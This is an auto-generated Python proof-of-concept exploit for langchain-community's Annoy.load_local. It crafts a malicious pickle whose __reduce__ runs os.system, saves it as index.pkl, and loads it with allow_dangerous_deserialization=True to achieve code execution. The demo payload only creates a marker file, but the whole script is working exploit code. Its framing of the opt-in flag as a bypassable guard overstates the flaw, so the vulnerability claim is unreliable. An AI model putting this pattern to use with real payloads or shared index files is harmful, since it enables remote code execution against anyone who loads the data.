#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_17.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file whose path is constructed from user-controlled folder_path.
Although there is a guard (allow_dangerous_deserialization) that must be set to True,
this guard is a developer-side check that can be bypassed if the caller sets it to True.
An attacker can provide a malicious pickle file that executes arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Setting up a local directory structure that mimics the expected format
3. Calling load_local with allow_dangerous_deserialization=True and the malicious folder_path

Usage: python3 poc_exploit.py [target_folder_path]
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration
TARGET_FOLDER = sys.argv[1] if len(sys.argv) > 1 else "/tmp/exploit_test"

def create_malicious_pickle():
    """
    Create a malicious pickle file that executes a benign command.
    The command creates a file /tmp/poc_success.txt to demonstrate RCE.
    """
    class MaliciousPickle:
        def __reduce__(self):
            # Benign payload: create a file to prove code execution
            return (os.system, ("touch /tmp/poc_success.txt",))
    
    return pickle.dumps(MaliciousPickle())

def setup_exploit_environment(folder_path):
    """
    Set up the directory structure expected by load_local:
    - folder_path/
    - folder_path/index.pkl (malicious pickle)
    - folder_path/index.annoy (dummy file, required but not used for RCE)
    """
    path = Path(folder_path)
    path.mkdir(parents=True, exist_ok=True)
    
    # Create malicious index.pkl
    malicious_data = create_malicious_pickle()
    with open(path / "index.pkl", "wb") as f:
        f.write(malicious_data)
    
    # Create dummy index.annoy (required by load_local but not used for RCE)
    with open(path / "index.annoy", "wb") as f:
        f.write(b"dummy")
    
    print(f"[+] Exploit environment set up at: {folder_path}")
    print(f"[+] Malicious pickle file created at: {path / 'index.pkl'}")

def trigger_exploit(folder_path):
    """
    Trigger the vulnerability by calling load_local with allow_dangerous_deserialization=True.
    This will execute the malicious pickle payload.
    """
    # Import the vulnerable function
    from langchain_community.vectorstores.annoy import Annoy
    
    print(f"[+] Calling load_local with folder_path: {folder_path}")
    print(f"[+] allow_dangerous_deserialization set to True")
    
    try:
        # This will trigger pickle.load on the malicious file
        # The malicious pickle will execute the command during deserialization
        result = Annoy.load_local(
            folder_path=folder_path,
            embeddings=None,  # Not needed for RCE
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local completed (may have raised an error due to missing embeddings)")
    except Exception as e:
        # Even if load_local fails after deserialization, the RCE already happened
        print(f"[+] Exception after deserialization (expected): {e}")
    
    # Check if the payload executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt was created - RCE confirmed!")
        print("[+] The malicious pickle executed the command during deserialization")
    else:
        print("[-] Payload did not execute - check if the vulnerability is present")

def cleanup(folder_path):
    """Clean up the exploit environment."""
    import shutil
    shutil.rmtree(folder_path, ignore_errors=True)
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
    print(f"[+] Cleaned up {folder_path}")

if __name__ == "__main__":
    print("=" * 60)
    print("PoC: RCE in langchain-community-only load_local")
    print("=" * 60)
    
    # Step 1: Set up the exploit environment
    setup_exploit_environment(TARGET_FOLDER)
    
    # Step 2: Trigger the vulnerability
    trigger_exploit(TARGET_FOLDER)
    
    # Step 3: Clean up (optional)
    # cleanup(TARGET_FOLDER)
    
    print("\n[+] Exploit completed. Check /tmp/poc_success.txt for proof of execution.")
